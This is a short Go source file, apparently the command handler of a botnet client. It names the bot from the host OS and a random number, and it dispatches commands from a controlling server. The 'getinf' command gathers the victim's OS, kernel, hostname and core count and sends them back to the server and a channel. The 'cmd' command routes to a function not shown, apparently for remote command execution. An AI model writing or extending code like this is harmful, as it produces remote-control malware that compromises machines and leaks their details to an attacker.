package botclientcommand

import (
	"fmt"
	"math/rand"
	"net"
	"strings"

	gi "github.com/matishsiao/goInfo"
)

var BotName string

//Getnick ...
func Getnick() string {
	temp := gi.GetInfo()
	rand := rand.Int63n(5000000)
	BotName = fmt.Sprintf("%s_%d", temp.GoOS, rand)
	return BotName
}

//HandleCommand ...
func HandleCommand(c net.Conn, message string) {
	fullCommand := strings.Split(message, " ")
	switch fullCommand[0] {

	case "getinf":
		go getInf(c)
		break
	case "cmd":
		go cmd(fullCommand, c)
		break
	}
}

func getInf(c net.Conn) {
	info := gi.GetInfo()
	sendToServer(c, "OS->"+info.OS+"- Platform ->"+info.Platform+"- Kernel ->"+info.Kernel+"- Host ->"+info.Hostname+"- Core ->"+info.Core)
	sendMessageToChannel("OS->" + info.OS + "- Platform ->" + info.Platform + "- Kernel ->" + info.Kernel + "- Host ->" + info.Hostname + "- Core ->" + info.Core)
}
